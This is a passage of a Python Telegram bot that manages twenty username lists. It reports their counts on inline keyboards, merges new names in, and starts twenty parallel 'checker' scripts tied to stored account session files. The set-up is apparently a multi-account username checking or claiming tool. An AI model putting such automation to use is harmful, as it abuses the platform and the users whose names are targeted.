                stutejdjdj3873_2 = str(stutejdjdj3873_2)
                try:
                    tbxnx388djjdj = open('users_num_3.txt','r').read()
                    yhdjd388hdjd = len(str(tbxnx388djjdj))
                    if int(yhdjd388hdjd) >= 7:
                        ghtjmhm = 0
                        yuju2041km = open('users_num_3.txt','r').read().splitlines()
                        for _ in yuju2041km:
                            ghtjmhm += 1
                        stutjdkdm3883e_3 = str(ghtjmhm)
                    else:
                        try:
                            os.remove('users_num_3.txt')
                        except:
                            pass
                        stutjdkdm3883e_3 = 'Not found ❎'
                except:
                    stutjdkdm3883e_3 = 'Not found ❎'
                stutjdkdm3883e_3 = str(stutjdkdm3883e_3)
                try:
                    udhjdn737xjjxnx = open('users_num_4.txt','r').read()
                    idhdjj377ndnd = len(str(udhjdn737xjjxnx))
                    if int(idhdjj377ndnd) >= 7:
                        rthnthnhtg = 0
                        yuju2041km = open('users_num_4.txt','r').read().splitlines()
                        for _ in yuju2041km:
                            rthnthnhtg += 1
                        stueu37ieoe_4 = str(rthnthnhtg)
                    else:
                        try:
                            os.remove('users_num_4.txt')
                        except:
                            pass
                        stueu37ieoe_4 = 'Not found ❎'
                except:
                    stueu37ieoe_4 = 'Not found ❎'
                stueu37ieoe_4 = str(stueu37ieoe_4)
                try:
                    odhdjjd27hdh = open('users_num_5.txt','r').read()
                    pdhdj388dhhd = len(str(odhdjjd27hdh))
                    if int(pdhdj388dhhd) >= 7:
                        gfnjmhjgh = 0
                        yuju2041km = open('users_num_5.txt','r').read().splitlines()
                        for _ in yuju2041km:
                            gfnjmhjgh += 1
                        studhkdj378te_5 = str(gfnjmhjgh)
                    else:
                        try:
                            os.remove('users_num_5.txt')
                        except:
                            pass
                        studhkdj378te_5 = 'Not found ❎'
                except:
                    studhkdj378te_5 = 'Not found ❎'
                studhkdj378te_5 = str(studhkdj378te_5)
                try:
                    adbdkjsj388jdndh = open('users_num_6.txt','r').read()
                    sdhdjj387dhhdh = len(str(adbdkjsj388jdndh))
                    if int(sdhdjj387dhhdh) >= 7:
                        ghngf = 0
                        yuju2041km = open('users_num_6.txt','r').read().splitlines()
                        for _ in yuju2041km:
                            ghngf += 1
                        studhdn388djjdte_6 = str(ghngf)
                    else:
                        try:
                            os.remove('users_num_6.txt')
                        except:
                            pass
                        studhdn388djjdte_6 = 'Not found ❎'
                except:
                    studhdn388djjdte_6 = 'Not found ❎'
                studhdn388djjdte_6 = str(studhdn388djjdte_6)
                try:
                    dhfjd37dj7jdjdj = open('users_num_7.txt','r').read()
                    fhdjdj37djjd = len(str(dhfjd37dj7jdjdj))
                    if int(fhdjdj37djjd) >= 7:
                        fjfgjnghm = 0
                        yuju2041km = open('users_num_7.txt','r').read().splitlines()
                        for _ in yuju2041km:
                            fjfgjnghm += 1
                        studhh377jdjdte_7 = str(fjfgjnghm)
                    else:
                        try:
                            os.remove('users_num_7.txt')
                        except:
                            pass
                        studhh377jdjdte_7 = 'Not found ❎'
                except:
                    studhh377jdjdte_7 = 'Not found ❎'
                studhh377jdjdte_7 = str(studhh377jdjdte_7)
                try:
                    gdhdh37dh38xn = open('users_num_8.txt','r').read()
                    hdhdh36shsh28 = len(str(gdhdh37dh38xn))
                    if int(hdhdh36shsh28) >= 7:
                        vnmgmhmjkj = 0
                        yuju2041km = open('users_num_8.txt','r').read().splitlines()
                        for _ in yuju2041km:
                            vnmgmhmjkj += 1
                        stubdhd37djjte_8 = str(vnmgmhmjkj)
                    else:
                        try:
                            os.remove('users_num_8.txt')
                        except:
                            pass
                        stubdhd37djjte_8 = 'Not found ❎'
                except:
                    stubdhd37djjte_8 = 'Not found ❎'
                stubdhd37djjte_8 = str(stubdhd37djjte_8)
                try:
                    jdhhd377jdjxh = open('users_num_9.txt','r').read()
                    khdhd3780bdbd = len(str(jdhhd377jdjxh))
                    if int(khdhd3780bdbd) >= 7:
                        ghkjhjkj = 0
                        yuju2041km = open('users_num_9.txt','r').read().splitlines()
                        for _ in yuju2041km:
                            ghkjhjkj += 1
                        stdhh377hxhdute_9 = str(ghkjhjkj)
                    else:
                        try:
                            os.remove('users_num_9.txt')
                        except:
                            pass
                        stdhh377hxhdute_9 = 'Not found ❎'
                except:
                    stdhh377hxhdute_9 = 'Not found ❎'
                stdhh377hxhdute_9 = str(stdhh377hxhdute_9)
                try:
                    lfhfj3770bdnff = open('users_num_10.txt','r').read()
                    zbdj2730hdjxj = len(str(lfhfj3770bdnff))
                    if int(zbdj2730hdjxj) >= 7:
                        yilyuhkmgty = 0
                        yuju2041km = open('users_num_10.txt','r').read().splitlines()
                        for _ in yuju2041km:
                            yilyuhkmgty += 1
                        stuhd38xnjx0te_10 = str(yilyuhkmgty)
                    else:
                        try:
                            os.remove('users_num_10.txt')
                        except:
                            pass
                        stuhd38xnjx0te_10 = 'Not found ❎'
                except:
                    stuhd38xnjx0te_10 = 'Not found ❎'
                stuhd38xnjx0te_10 = str(stuhd38xnjx0te_10)
                try:
                    xdhhd38802bxnx = open('users_num_11.txt','r').read()
                    chs1840cbhch = len(str(xdhhd38802bxnx))
                    if int(chs1840cbhch) >= 7:
                        yukhhjhgu = 0
                        yuju2041km = open('users_num_11.txt','r').read().splitlines()
                        for _ in yuju2041km:
                            yukhhjhgu += 1
                        st288hdhdhute_11 = str(yukhhjhgu)
                    else:
                        try:
                            os.remove('users_num_11.txt')
                        except:
                            pass
                        st288hdhdhute_11 = 'Not found ❎'
                except:
                    st288hdhdhute_11 = 'Not found ❎'
                st288hdhdhute_11 = str(st288hdhdhute_11)
                try:
                    vdhjd27nxnx = open('users_num_12.txt','r').read()
                    b37jxjx29 = len(str(vdhjd27nxnx))
                    if int(b37jxjx29) >= 7:
                        ghjguhkyh = 0
                        yuju2041km = open('users_num_12.txt','r').read().splitlines()
                        for _ in yuju2041km:
                            ghjguhkyh += 1
                        sthdhd2738jdjute_12 = str(ghjguhkyh)
                    else:
                        try:
                            os.remove('users_num_12.txt')
                        except:
                            pass
                        sthdhd2738jdjute_12 = 'Not found ❎'
                except:
                    sthdhd2738jdjute_12 = 'Not found ❎'
                sthdhd2738jdjute_12 = str(sthdhd2738jdjute_12)
                try:
                    ndhsj288nxn = open('users_num_13.txt','r').read()
                    mhdh2802xbjc = len(str(ndhsj288nxn))
                    if int(mhdh2802xbjc) >= 7:
                        ghjyukuyi = 0
                        yuju2041km = open('users_num_13.txt','r').read().splitlines()
                        for _ in yuju2041km:
                            ghjyukuyi += 1
                        st2939ndjdjute_13 = str(ghjyukuyi)
                    else:
                        try:
                            os.remove('users_num_13.txt')
                        except:
                            pass
                        st2939ndjdjute_13 = 'Not found ❎'
                except:
                    st2939ndjdjute_13 = 'Not found ❎'
                st2939ndjdjute_13 = str(st2939ndjdjute_13)
                try:
                    q2fgh560ghk = open('users_num_14.txt','r').read()
                    w2fhj46gh = len(str(q2fgh560ghk))
                    if int(w2fhj46gh) >= 7:
                        jhhjklfjhj = 0
                        yuju2041km = open('users_num_14.txt','r').read().splitlines()
                        for _ in yuju2041km:
                            jhhjklfjhj += 1
                        sthjkojh456ggute_14 = str(jhhjklfjhj)
                    else:
                        try:
                            os.remove('users_num_14.txt')
                        except:
                            pass
                        sthjkojh456ggute_14 = 'Not found ❎'
                except:
                    sthjkojh456ggute_14 = 'Not found ❎'
                sthjkojh456ggute_14 = str(sthjkojh456ggute_14)
                try:
                    e2fhjbfyilh568gg = open('users_num_15.txt','r').read()
                    r2fgjppjbdw45gh = len(str(e2fhjbfyilh568gg))
                    if int(r2fgjppjbdw45gh) >= 7:
                        ytjtyjjmht = 0
                        yuju2041km = open('users_num_15.txt','r').read().splitlines()
                        for _ in yuju2041km:
                            ytjtyjjmht += 1
                        stu457hjlbv34te_15 = str(ytjtyjjmht)
                    else:
                        try:
                            os.remove('users_num_15.txt')
                        except:
                            pass
                        stu457hjlbv34te_15 = 'Not found ❎'
                except:
                    stu457hjlbv34te_15 = 'Not found ❎'
                stu457hjlbv34te_15 = str(stu457hjlbv34te_15)
                try:
                    t2fjkk56ghk = open('users_num_16.txt','r').read()
                    y2cgllvxs56gh = len(str(t2fjkk56ghk))
                    if int(y2cgllvxs56gh) >= 7:
                        gfjtghukmhhj = 0
                        yuju2041km = open('users_num_16.txt','r').read().splitlines()
                        for _ in yuju2041km:
                            gfjtghukmhhj += 1
                        stu66hjnv56te_16 = str(gfjtghukmhhj)
                    else:
                        try:
                            os.remove('users_num_16.txt')
                        except:
                            pass
                        stu66hjnv56te_16 = 'Not found ❎'
                except:
                    stu66hjnv56te_16 = 'Not found ❎'
                stu66hjnv56te_16 = str(stu66hjnv56te_16)
                try:
                    u2chjhypph56hj = open('users_num_17.txt','r').read()
                    i2fuited55gh = len(str(u2chjhypph56hj))
                    if int(i2fuited55gh) >= 7:
                        tyjkyukkug = 0
                        yuju2041km = open('users_num_17.txt','r').read().splitlines()
                        for _ in yuju2041km:
                            tyjkyukkug += 1
                        stutdh56gje_17 = str(tyjkyukkug)
                    else:
                        try:
                            os.remove('users_num_17.txt')
                        except:
                            pass
                        stutdh56gje_17 = 'Not found ❎'
                except:
                    stutdh56gje_17 = 'Not found ❎'
                stutdh56gje_17 = str(stutdh56gje_17)
                try:
                    o2hxjsj288bdbd = open('users_num_18.txt','r').read()
                    p2hdjdjwp277bdh = len(str(o2hxjsj288bdbd))
                    if int(p2hdjdjwp277bdh) >= 7:
                        ytkhjugklk = 0
                        yuju2041km = open('users_num_18.txt','r').read().splitlines()
                        for _ in yuju2041km:
                            ytkhjugklk += 1
                        shddu288dbbdtute_18 = str(ytkhjugklk)
                    else:
                        try:
                            os.remove('users_num_18.txt')
                        except:
                            pass
                        shddu288dbbdtute_18 = 'Not found ❎'
                except:
                    shddu288dbbdtute_18 = 'Not found ❎'
                shddu288dbbdtute_18 = str(shddu288dbbdtute_18)
                try:
                    a2hdjd20bdb = open('users_num_19.txt','r').read()
                    s2xhdk388dbhx = len(str(a2hdjd20bdb))
                    if int(s2xhdk388dbhx) >= 7:
                        ghnhyjkmuik = 0
                        yuju2041km = open('users_num_19.txt','r').read().splitlines()
                        for _ in yuju2041km:
                            ghnhyjkmuik += 1
                        studj28bdhte_19 = str(ghnhyjkmuik)
                    else:
                        try:
                            os.remove('users_num_19.txt')
                        except:
                            pass
                        studj28bdhte_19 = 'Not found ❎'
                except:
                    studj28bdhte_19 = 'Not found ❎'
                studj28bdhte_19 = str(studj28bdhte_19)
                try:
                    d2bdjd20dbhd = open('users_num_20.txt','r').read()
                    f2dhsupqps28 = len(str(d2bdjd20dbhd))
                    if int(f2dhsupqps28) >= 7:
                        gfjyuku = 0
                        yuju2041km = open('users_num_20.txt','r').read().splitlines()
                        for _ in yuju2041km:
                            gfjyuku += 1
                        s738dbjdtute_20 = str(gfjyuku)
                    else:
                        try:
                            os.remove('users_num_20.txt')
                        except:
                            pass
                        s738dbjdtute_20 = 'Not found ❎'
                except:
                    s738dbjdtute_20 = 'Not found ❎'
                s738dbjdtute_20 = str(s738dbjdtute_20)
                keyboard0 = types.InlineKeyboardMarkup(row_width=2)
                button01 = types.InlineKeyboardButton(text='Number 👇',callback_data='page_pass')
                button02 = types.InlineKeyboardButton(text='The status of usernames 👇',callback_data='page_pass')
                button03 = types.InlineKeyboardButton(text='1-: ',callback_data='page_pass')
                button04 = types.InlineKeyboardButton(text=str(stuteejjdnxn_1),callback_data='page_add_usernames')
                button05 = types.InlineKeyboardButton(text='2-: ',callback_data='page_pass')
                button06 = types.InlineKeyboardButton(text=str(stutejdjdj3873_2),callback_data='page_add_usernames')
                button07 = types.InlineKeyboardButton(text='3-: ',callback_data='page_pass')
                button08 = types.InlineKeyboardButton(text=str(stutjdkdm3883e_3),callback_data='page_add_usernames')
                button09 = types.InlineKeyboardButton(text='4-: ',callback_data='page_pass')
                button10 = types.InlineKeyboardButton(text=str(stueu37ieoe_4),callback_data='page_add_usernames')
                button11 = types.InlineKeyboardButton(text='5-: ',callback_data='page_pass')
                button12 = types.InlineKeyboardButton(text=str(studhkdj378te_5),callback_data='page_add_usernames')
                button13 = types.InlineKeyboardButton(text='6-: ',callback_data='page_pass')
                button14 = types.InlineKeyboardButton(text=str(studhdn388djjdte_6),callback_data='page_add_usernames')
                button15 = types.InlineKeyboardButton(text='7-: ',callback_data='page_pass')
                button16 = types.InlineKeyboardButton(text=str(studhh377jdjdte_7),callback_data='page_add_usernames')
                button17 = types.InlineKeyboardButton(text='8-: ',callback_data='page_pass')
                button18 = types.InlineKeyboardButton(text=str(stubdhd37djjte_8),callback_data='page_add_usernames')
                button19 = types.InlineKeyboardButton(text='9-: ',callback_data='page_pass')
                button20 = types.InlineKeyboardButton(text=str(stdhh377hxhdute_9),callback_data='page_add_usernames')
                button21 = types.InlineKeyboardButton(text='10-: ',callback_data='page_pass')
                button22 = types.InlineKeyboardButton(text=str(stuhd38xnjx0te_10),callback_data='page_add_usernames')
                button23 = types.InlineKeyboardButton(text='11-: ',callback_data='page_pass')
                button24 = types.InlineKeyboardButton(text=str(st288hdhdhute_11),callback_data='page_add_usernames')
                button25 = types.InlineKeyboardButton(text='12-: ',callback_data='page_pass')
                button26 = types.InlineKeyboardButton(text=str(sthdhd2738jdjute_12),callback_data='page_add_usernames')
                button27 = types.InlineKeyboardButton(text='13-: ',callback_data='page_pass')
                button28 = types.InlineKeyboardButton(text=str(st2939ndjdjute_13),callback_data='page_add_usernames')
                button29 = types.InlineKeyboardButton(text='14-: ',callback_data='page_pass')
                button30 = types.InlineKeyboardButton(text=str(sthjkojh456ggute_14),callback_data='page_add_usernames')
                button31 = types.InlineKeyboardButton(text='15-: ',callback_data='page_pass')
                button32 = types.InlineKeyboardButton(text=str(stu457hjlbv34te_15),callback_data='page_add_usernames')
                button33 = types.InlineKeyboardButton(text='16-: ',callback_data='page_pass')
                button34 = types.InlineKeyboardButton(text=str(stu66hjnv56te_16),callback_data='page_add_usernames')
                button35 = types.InlineKeyboardButton(text='17-: ',callback_data='page_pass')
                button36 = types.InlineKeyboardButton(text=str(stutdh56gje_17),callback_data='page_add_usernames')
                button37 = types.InlineKeyboardButton(text='18-: ',callback_data='page_pass')
                button38 = types.InlineKeyboardButton(text=str(shddu288dbbdtute_18),callback_data='page_add_usernames')
                button39 = types.InlineKeyboardButton(text='19-: ',callback_data='page_pass')
                button40 = types.InlineKeyboardButton(text=str(studj28bdhte_19),callback_data='page_add_usernames')
                button41 = types.InlineKeyboardButton(text='20-: ',callback_data='page_pass')
                button42 = types.InlineKeyboardButton(text=str(s738dbjdtute_20),callback_data='page_add_usernames')
                button43 = types.InlineKeyboardButton(text='Back to the main page',callback_data='page_main')
                keyboard0.add(button01,button02,button03,button04,button05,button06,button07,button08,button09,button10,button11,button12,button13,button14,button15,button16,button17,button18,button19,button20,button21,button22,button23,button24,button25,button26,button27,button28,button29,button30,button31,button32,button33,button34,button35,button36,button37,button38,button39,button40,button41,button42,button43)
                bot.edit_message_text(chat_id=chat_id,message_id=message_id,text='Choose what you want 👇',reply_markup=keyboard0)
    
            elif str(data) == 'page_add_usernames':
                keyboard0 = types.InlineKeyboardMarkup(row_width=1)
                button01 = types.InlineKeyboardButton(text='Back to before',callback_data='page_usernames')
                button02 = types.InlineKeyboardButton(text='Back to the main page',callback_data='page_main')
                keyboard0.add(button01,button02)
                bot.edit_message_text(chat_id=chat_id,message_id=message_id,text='To add usernames, send me the command like this\n\n/a_n_us_1 @usernames\n/a_n_us_2 @usernames\n/a_n_us_3 @usernames\n/a_n_us_4 @usernames\n/a_n_us_5 @usernames\n\nNote: The command is used. "/a_n_us_5" to add the usernames to the fifth number, and the number 5 changes depending on the number to which you want to add the usernames',reply_markup=keyboard0)
    
            elif str(data) == 'page_adding_the_usernames_one':
                fnkdjsj3883 = open('target_number_eg.txt','r').read()
                q = open('users_num_'+str(fnkdjsj3883)+'a.txt','r').read()
                try:
                    os.remove('users_num_'+str(fnkdjsj3883)+'.txt')
                except:
                    pass
                try:
                    os.remove('users_num_'+str(fnkdjsj3883)+'a.txt')
                except:
                    pass
                try:
                    os.remove('users_num_'+str(fnkdjsj3883)+'b.txt')
                except:
                    pass
                try:
                    os.remove('target_number_eg.txt')
                except:
                    pass
                open('users_num_'+str(fnkdjsj3883)+'.txt','a').write(str(q)+'\n')
                yuju2041km = open('users_num_'+str(fnkdjsj3883)+'.txt','r').read().splitlines()
                for jhgtfkhfi in yuju2041km:
                    try:
                        klhgth = open('users_num_'+str(fnkdjsj3883)+'a.txt','r').read()
                        if str(jhgtfkhfi) in str(klhgth):
                            pass
                        else:
                            open('users_num_'+str(fnkdjsj3883)+'a.txt','a').write(str(jhgtfkhfi)+'\n')
                    except:
                        open('users_num_'+str(fnkdjsj3883)+'a.txt','a').write(str(jhgtfkhfi)+'\n')
                try:
                    os.remove('users_num_'+str(fnkdjsj3883)+'.txt')
                except:
                    pass
                tjyukuikl = open('users_num_'+str(fnkdjsj3883)+'a.txt','r').read()
                try:
                    os.remove('users_num_'+str(fnkdjsj3883)+'a.txt')
                except:
                    pass
                open('users_num_'+str(fnkdjsj3883)+'.txt','a').write(str(tjyukuikl))
                keyboard0 = types.InlineKeyboardMarkup(row_width=1)
                button01 = types.InlineKeyboardButton(text='Back to before',callback_data='page_add_usernames')
                button02 = types.InlineKeyboardButton(text='Back to the main page',callback_data='page_main')
                keyboard0.add(button01,button02)
                bot.edit_message_text(chat_id=chat_id,message_id=message_id,text='The old usernames were deleted and the new ones were saved successfully',reply_markup=keyboard0)
    
            elif str(data) == 'page_adding_the_usernames_two':
                fnkdjsj3883 = open('target_number_eg.txt','r').read()
                try:
                    os.remove('target_number_eg.txt')
                except:
                    pass
                try:
                    os.remove('users_num_'+str(fnkdjsj3883)+'b.txt')
                except:
                    pass
                q = open('users_num_'+str(fnkdjsj3883)+'.txt','r').read()
                w = open('users_num_'+str(fnkdjsj3883)+'a.txt','r').read()
                try:
                    os.remove('users_num_'+str(fnkdjsj3883)+'.txt')
                except:
                    pass
                try:
                    os.remove('users_num_'+str(fnkdjsj3883)+'a.txt')
                except:
                    pass
                open('users_num_'+str(fnkdjsj3883)+'.txt','a').write(str(q)+str(w)+'\n')
                yuju2041km = open('users_num_'+str(fnkdjsj3883)+'.txt','r').read().splitlines()
                for jhgtfkhfi in yuju2041km:
                    try:
                        klhgth = open('users_num_'+str(fnkdjsj3883)+'a.txt','r').read()
                        if str(jhgtfkhfi) in str(klhgth):
                            pass
                        else:
                            open('users_num_'+str(fnkdjsj3883)+'a.txt','a').write(str(jhgtfkhfi)+'\n')
                    except:
                        open('users_num_'+str(fnkdjsj3883)+'a.txt','a').write(str(jhgtfkhfi)+'\n')
                try:
                    os.remove('users_num_'+str(fnkdjsj3883)+'.txt')
                except:
                    pass
                tjyukuikl = open('users_num_'+str(fnkdjsj3883)+'a.txt','r').read()
                try:
                    os.remove('users_num_'+str(fnkdjsj3883)+'a.txt')
                except:
                    pass
                open('users_num_'+str(fnkdjsj3883)+'.txt','a').write(str(tjyukuikl))
                keyboard0 = types.InlineKeyboardMarkup(row_width=1)
                button01 = types.InlineKeyboardButton(text='Back to before',callback_data='page_add_usernames')
                button02 = types.InlineKeyboardButton(text='Back to the main page',callback_data='page_main')
                keyboard0.add(button01,button02)
                bot.edit_message_text(chat_id=chat_id,message_id=message_id,text='The new usernames have been successfully saved with the old ones',reply_markup=keyboard0)







            elif str(data) == 'page_start_scan':
                if os.path.exists('session_num_1.txt') and os.path.exists('users_num_1.txt') and os.path.exists('checker_num_1.py'):
                    dhj27djdhsjs = 'available'
                else:
                    dhj27djdhsjs = 'not_found'
                dhj27djdhsjs = str(dhj27djdhsjs)
                if os.path.exists('session_num_2.txt') and os.path.exists('users_num_2.txt') and os.path.exists('checker_num_2.py'):
                    dhkdjs737hdh = 'available'
                else:
                    dhkdjs737hdh = 'not_found'
                dhkdjs737hdh = str(dhkdjs737hdh)
                if os.path.exists('session_num_3.txt') and os.path.exists('users_num_3.txt') and os.path.exists('checker_num_3.py'):
                    dhek377hdhd = 'available'
                else:
                    dhek377hdhd = 'not_found'
                dhek377hdhd = str(dhek377hdhd)
                if os.path.exists('session_num_4.txt') and os.path.exists('users_num_4.txt') and os.path.exists('checker_num_4.py'):
                    hdkdjsb73bfb = 'available'
                else:
                    hdkdjsb73bfb = 'not_found'
                hdkdjsb73bfb = str(hdkdjsb73bfb)
                if os.path.exists('session_num_5.txt') and os.path.exists('users_num_5.txt') and os.path.exists('checker_num_5.py'):
                    dhis278akls = 'available'
                else:
                    dhis278akls = 'not_found'
                dhis278akls = str(dhis278akls)
                if os.path.exists('session_num_6.txt') and os.path.exists('users_num_6.txt') and os.path.exists('checker_num_6.py'):
                    jeks20bdbf = 'available'
                else:
                    jeks20bdbf = 'not_found'
                jeks20bdbf = str(jeks20bdbf)
                if os.path.exists('session_num_7.txt') and os.path.exists('users_num_7.txt') and os.path.exists('checker_num_7.py'):
                    dhsolapell737 = 'available'
                else:
                    dhsolapell737 = 'not_found'
                dhsolapell737 = str(dhsolapell737)
                if os.path.exists('session_num_8.txt') and os.path.exists('users_num_8.txt') and os.path.exists('checker_num_8.py'):
                    dhdkjs377hdh = 'available'
                else:
                    dhdkjs377hdh = 'not_found'
                dhdkjs377hdh = str(dhdkjs377hdh)
                if os.path.exists('session_num_9.txt') and os.path.exists('users_num_9.txt') and os.path.exists('checker_num_9.py'):
                    dheisoks363 = 'available'
                else:
                    dheisoks363 = 'not_found'
                dheisoks363 = str(dheisoks363)
                if os.path.exists('session_num_10.txt') and os.path.exists('users_num_10.txt') and os.path.exists('checker_num_10.py'):
                    dhs27dbfjj = 'available'
                else:
                    dhs27dbfjj = 'not_found'
                dhs27dbfjj = str(dhs27dbfjj)
                if os.path.exists('session_num_11.txt') and os.path.exists('users_num_11.txt') and os.path.exists('checker_num_11.py'):
                    hdjsp28fjjf = 'available'
                else:
                    hdjsp28fjjf = 'not_found'
                hdjsp28fjjf = str(hdjsp28fjjf)
                if os.path.exists('session_num_12.txt') and os.path.exists('users_num_12.txt') and os.path.exists('checker_num_12.py'):
                    dhhdye37ndj = 'available'
                else:
                    dhhdye37ndj = 'not_found'
                dhhdye37ndj = str(dhhdye37ndj)
                if os.path.exists('session_num_13.txt') and os.path.exists('users_num_13.txt') and os.path.exists('checker_num_13.py'):
                    dhksja377bdbd = 'available'
                else:
                    dhksja377bdbd = 'not_found'
                dhksja377bdbd = str(dhksja377bdbd)
                if os.path.exists('session_num_14.txt') and os.path.exists('users_num_14.txt') and os.path.exists('checker_num_14.py'):
                    epfk37dhfk = 'available'
                else:
                    epfk37dhfk = 'not_found'
                epfk37dhfk = str(epfk37dhfk)
                if os.path.exists('session_num_15.txt') and os.path.exists('users_num_15.txt') and os.path.exists('checker_num_15.py'):
                    s377pddndnkj = 'available'
                else:
                    s377pddndnkj = 'not_found'
                s377pddndnkj = str(s377pddndnkj)
                if os.path.exists('session_num_16.txt') and os.path.exists('users_num_16.txt') and os.path.exists('checker_num_16.py'):
                    dkelu367ndjf = 'available'
                else:
                    dkelu367ndjf = 'not_found'
                dkelu367ndjf = str(dkelu367ndjf)
                if os.path.exists('session_num_17.txt') and os.path.exists('users_num_17.txt') and os.path.exists('checker_num_17.py'):
                    wyeu3636kdkf = 'available'
                else:
                    wyeu3636kdkf = 'not_found'
                wyeu3636kdkf = str(wyeu3636kdkf)
                if os.path.exists('session_num_18.txt') and os.path.exists('users_num_18.txt') and os.path.exists('checker_num_18.py'):
                    dheo366hdjf = 'available'
                else:
                    dheo366hdjf = 'not_found'
                dheo366hdjf = str(dheo366hdjf)
                if os.path.exists('session_num_19.txt') and os.path.exists('users_num_19.txt') and os.path.exists('checker_num_19.py'):
                    hdkdkej637 = 'available'
                else:
                    hdkdkej637 = 'not_found'
                hdkdkej637 = str(hdkdkej637)
                if os.path.exists('session_num_20.txt') and os.path.exists('users_num_20.txt') and os.path.exists('checker_num_20.py'):
                    wlld377jdghdjs = 'available'
                else:
                    wlld377jdghdjs = 'not_found'
                wlld377jdghdjs = str(wlld377jdghdjs)
                if str(dhj27djdhsjs) == 'available' and str(dhkdjs737hdh) == 'available' and str(dhek377hdhd) == 'available' and str(hdkdjsb73bfb) == 'available' and str(dhis278akls) == 'available' and str(jeks20bdbf) == 'available' and str(dhsolapell737) == 'available' and str(dhdkjs377hdh) == 'available' and str(dheisoks363) == 'available' and str(dhs27dbfjj) == 'available' and str(hdjsp28fjjf) == 'available' and str(dhhdye37ndj) == 'available' and str(dhksja377bdbd) == 'available' and str(epfk37dhfk) == 'available' and str(s377pddndnkj) == 'available' and str(dkelu367ndjf) == 'available' and str(wyeu3636kdkf) == 'available' and str(dheo366hdjf) == 'available' and str(hdkdkej637) == 'available' and str(wlld377jdghdjs) == 'available':
                    for _ in range(10):
                        os.system('pkill -f assistant.py')
                    def run_script(script_name):
                        subprocess.run(['python3', script_name])
                    if __name__ == '__main__':
                        scripts = ['checker_num_1.py','checker_num_2.py','checker_num_3.py','checker_num_4.py','checker_num_5.py','checker_num_6.py','checker_num_7.py','checker_num_8.py','checker_num_9.py','checker_num_10.py','checker_num_11.py','checker_num_12.py','checker_num_13.py','checker_num_14.py','checker_num_15.py','checker_num_16.py','checker_num_17.py','checker_num_18.py','checker_num_19.py','checker_num_20.py']
                        processes = []
                        for script in scripts:
                            process = multiprocessing.Process(target=run_script, args=(script,))
                            processes.append(process)
                            process.start()
                        for process in processes:
                            process.join()
                else:
                    if os.path.exists('session_num_1.txt') and os.path.exists('users_num_1.txt') and os.path.exists('checker_num_1.py'):
                        dhj27djdhsjs = 'Available ✅'
                    else:
                        dhj27djdhsjs = 'Not found ❎'
                    dhj27djdhsjs = str(dhj27djdhsjs)
                    if str(dhj27djdhsjs) == 'Available ✅':
                        dbj637djdh = 'page_run_check_num_1'
                    else:
                        dbj637djdh = 'page_pass'
                    dbj637djdh = str(dbj637djdh)
                    if os.path.exists('session_num_2.txt') and os.path.exists('users_num_2.txt') and os.path.exists('checker_num_2.py'):
                        dhkdjs737hdh = 'Available ✅'
                    else:
                        dhkdjs737hdh = 'Not found ❎'
                    dhkdjs737hdh = str(dhkdjs737hdh)
                    if str(dhkdjs737hdh) == 'Available ✅':
                        kxkdos737 = 'page_run_check_num_2'
                    else:
                        kxkdos737 = 'page_pass'
                    kxkdos737 = str(kxkdos737)
                    if os.path.exists('session_num_3.txt') and os.path.exists('users_num_3.txt') and os.path.exists('checker_num_3.py'):
                        dhek377hdhd = 'Available ✅'
                    else:
                        dhek377hdhd = 'Not found ❎'
                    dhek377hdhd = str(dhek377hdhd)
                    if str(dhek377hdhd) == 'Available ✅':
                        bdisjhs637djjd = 'page_run_check_num_3'
                    else:
                        bdisjhs637djjd = 'page_pass'
                    bdisjhs637djjd = str(bdisjhs637djjd)
                    if os.path.exists('session_num_4.txt') and os.path.exists('users_num_4.txt') and os.path.exists('checker_num_4.py'):
                        hdkdjsb73bfb = 'Available ✅'
                    else:
                        hdkdjsb73bfb = 'Not found ❎'
                    hdkdjsb73bfb = str(hdkdjsb73bfb)
                    if str(hdkdjsb73bfb) == 'Available ✅':
                        djd377bdjdjc = 'page_run_check_num_4'
                    else:
                        djd377bdjdjc = 'page_pass'
                    djd377bdjdjc = str(djd377bdjdjc)
                    if os.path.exists('session_num_5.txt') and os.path.exists('users_num_5.txt') and os.path.exists('checker_num_5.py'):
                        dhis278akls = 'Available ✅'
                    else:
                        dhis278akls = 'Not found ❎'
                    dhis278akls = str(dhis278akls)
                    if str(dhis278akls) == 'Available ✅':
                        dnsi377udjd = 'page_run_check_num_5'
                    else:
                        dnsi377udjd = 'page_pass'
                    dnsi377udjd = str(dnsi377udjd)
                    if os.path.exists('session_num_6.txt') and os.path.exists('users_num_6.txt') and os.path.exists('checker_num_6.py'):
                        jeks20bdbf = 'Available ✅'
                    else:
                        jeks20bdbf = 'Not found ❎'
                    jeks20bdbf = str(jeks20bdbf)
                    if str(jeks20bdbf) == 'Available ✅':
                        hdjsj367bxjcj = 'page_run_check_num_6'
                    else:
                        hdjsj367bxjcj = 'page_pass'
                    hdjsj367bxjcj = str(hdjsj367bxjcj)
                    if os.path.exists('session_num_7.txt') and os.path.exists('users_num_7.txt') and os.path.exists('checker_num_7.py'):
                        dhsolapell737 = 'Available ✅'
                    else:
                        dhsolapell737 = 'Not found ❎'
                    dhsolapell737 = str(dhsolapell737)
                    if str(dhsolapell737) == 'Available ✅':
                        djiehdh377kdkdjc = 'page_run_check_num_7'
                    else:
                        djiehdh377kdkdjc = 'page_pass'
                    djiehdh377kdkdjc = str(djiehdh377kdkdjc)
                    if os.path.exists('session_num_8.txt') and os.path.exists('users_num_8.txt') and os.path.exists('checker_num_8.py'):
                        dhdkjs377hdh = 'Available ✅'
                    else:
                        dhdkjs377hdh = 'Not found ❎'
                    dhdkjs377hdh = str(dhdkjs377hdh)
                    if str(dhdkjs377hdh) == 'Available ✅':
                        hdidjteu367jxjc = 'page_run_check_num_8'
                    else:
                        hdidjteu367jxjc = 'page_pass'
                    hdidjteu367jxjc = str(hdidjteu367jxjc)
                    if os.path.exists('session_num_9.txt') and os.path.exists('users_num_9.txt') and os.path.exists('checker_num_9.py'):
                        dheisoks363 = 'Available ✅'
                    else:
                        dheisoks363 = 'Not found ❎'
                    dheisoks363 = str(dheisoks363)
                    if str(dheisoks363) == 'Available ✅':
                        ehirnfh636ndnf = 'page_run_check_num_9'
                    else:
                        ehirnfh636ndnf = 'page_pass'
                    ehirnfh636ndnf = str(ehirnfh636ndnf)
                    if os.path.exists('session_num_10.txt') and os.path.exists('users_num_10.txt') and os.path.exists('checker_num_10.py'):
                        dhs27dbfjj = 'Available ✅'
                    else:
                        dhs27dbfjj = 'Not found ❎'
                    dhs27dbfjj = str(dhs27dbfjj)
                    if str(dhs27dbfjj) == 'Available ✅':
